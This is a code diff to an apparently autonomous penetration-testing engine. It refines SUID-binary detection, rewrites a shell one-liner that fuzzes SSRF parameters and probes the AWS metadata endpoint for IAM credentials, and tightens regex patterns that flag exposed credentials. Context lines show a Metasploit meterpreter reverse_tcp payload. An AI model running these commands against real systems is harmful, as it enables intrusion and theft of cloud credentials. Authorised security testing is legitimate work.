@@ -1505,7 +1505,16 @@ def _parse_tool_output(tool, output_text, rhost="", job_name=""):
         })
 
     # ── SUID binaries found ───────────────────────────────────────────────────
-    suid_bins = re.findall(r'(/[/\w\-]+(?:python|perl|ruby|bash|sh|find|nmap|vim|nano|cp|mv|less|more|awk|tar|zip|curl|wget)\d*)\b', output_text)
+    # Require a proper absolute path prefix (/usr/bin, /bin, /sbin, /usr/sbin, /opt/.../bin)
+    # and a word boundary AFTER the tool name to avoid matching /tcp, //nmap, /openssh/openssh etc.
+    suid_bins = re.findall(
+        r'(/(?:usr(?:/local)?/(?:bin|sbin)|bin|sbin|opt/[^/\s]+/bin)'
+        r'/(?:python|perl|ruby|bash|dash|find|nmap|vim|nano|awk|tar|zip|curl|wget|mv|less|more)'
+        r'(?:\d+(?:\.\d+)?)?)\b',
+        output_text,
+    )
+    # Remove duplicates and any path that still looks wrong (must be a real absolute path)
+    suid_bins = [p for p in dict.fromkeys(suid_bins) if p.count('/') >= 2 and len(p) > 5]
     if suid_bins:
         findings.append({
             "id": str(uuid.uuid4()), "title": f"PrivEsc — SUID Bins Explotables ({len(suid_bins)})",
@@ -4350,13 +4359,14 @@ def _kb_commands(port, service, version, target, mode):
                 # SSRF parameter fuzzing
                 (48, f"SSRF-Fuzz:{port}",
                  f"LHOST=$(hostname -I | awk '{{print $1}}'); "
+                 f"BASELINE=$(curl -s --max-time 5 '{url}/' 2>/dev/null | wc -c); "
                  f"for ssrf_param in url redirect redirect_to return return_to next dest destination path file image proxy load callback img data; do "
-                 f"R=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 "
-                 f"'{url}/?'$ssrf_param'=http://127.0.0.1:80/' 2>/dev/null); "
-                 f"[ \"$R\" = '200' ] && echo \"SSRF_CANDIDATE: param=$ssrf_param status=$R\"; "
+                 f"R_LEN=$(curl -s --max-time 5 '{url}/?'$ssrf_param'=http://127.0.0.1:65534/' 2>/dev/null | wc -c); "
+                 f"[ \"$R_LEN\" -gt 0 ] && [ \"$R_LEN\" -ne \"$BASELINE\" ] && echo \"SSRF_CANDIDATE: param=$ssrf_param len_diff=$((R_LEN - BASELINE))\"; "
                  f"R2=$(curl -s --max-time 5 "
-                 f"'{url}/?'$ssrf_param'=http://169.254.169.254/latest/meta-data/' 2>/dev/null | head -3); "
-                 f"[ -n \"$R2\" ] && echo \"SSRF_CLOUD_METADATA: $ssrf_param → $R2\"; done; "
+                 f"'{url}/?'$ssrf_param'=http://169.254.169.254/latest/meta-data/' 2>/dev/null | head -10); "
+                 f"echo \"$R2\" | grep -qE '(ami-id|instance-id|instance-type|local-hostname|security-credentials|AccessKeyId|block-device-mapping)' "
+                 f"&& echo \"SSRF_CLOUD_METADATA_CONFIRMED: $ssrf_param → $(echo $R2 | head -c 200)\"; done; "
                  f"# SSRF via headers "
                  f"for h in X-Forwarded-For Referer X-Real-IP Client-IP X-Custom-IP-Authorization; do "
                  f"curl -s --max-time 5 -H \"$h: 169.254.169.254\" '{url}/' 2>/dev/null | grep -i 'ami-id\\|instance-id\\|iam\\|security-credentials' | head -2; done"),
@@ -5473,7 +5483,7 @@ class AutonomousEngine:
             # Shadow Credentials
             (r'[Ss]hadow [Cc]redentials.*[Aa]dded|KeyCredential.*added|pywhisker.*[Ss]uccess', "Shadow Credentials — KeyCredential Añadido (msDS-KeyCredentialLink)", "high", "", 8.8),
             # SSRF / Cloud
-            (r'SSRF_CLOUD_METADATA|security-credentials.*AccessKeyId|iam.*role.*arn:', "SSRF → Metadata Cloud Expuesto (Credenciales IAM)", "critical", "", 9.1),
+            (r'SSRF_CLOUD_METADATA_CONFIRMED|security-credentials.*AccessKeyId|"AccessKeyId"\s*:|iam.*security-credentials.*\w{16}', "SSRF → AWS Metadata Expuesto (Credenciales IAM)", "critical", "", 9.1),
         ]
 
         for pattern, title, severity, cve, cvss in EXPLOIT_MARKERS:
@@ -5935,7 +5945,7 @@ class AutonomousEngine:
                 f"set PAYLOAD windows/x64/meterpreter/reverse_tcp; run; sleep 20; exit' 2>/dev/null", target)
 
         # ── SSRF cloud metadata detected → extract credentials ───────────────
-        if re.search(r'SSRF_CLOUD_METADATA|ami-id|instance-id|iam.*security-credentials|SSRF_CANDIDATE', output, re.I):
+        if re.search(r'SSRF_CLOUD_METADATA_CONFIRMED|"AccessKeyId"\s*:|iam.*security-credentials.*\w{16}|ami-id\ninstance-id', output, re.I):
             _param_m = re.search(r'SSRF_CANDIDATE:\s*param=(\S+)', output)
             _param = _param_m.group(1) if _param_m else "url"
             _ports_set = {p for p, s, v in self._known_services.get(target, [])}
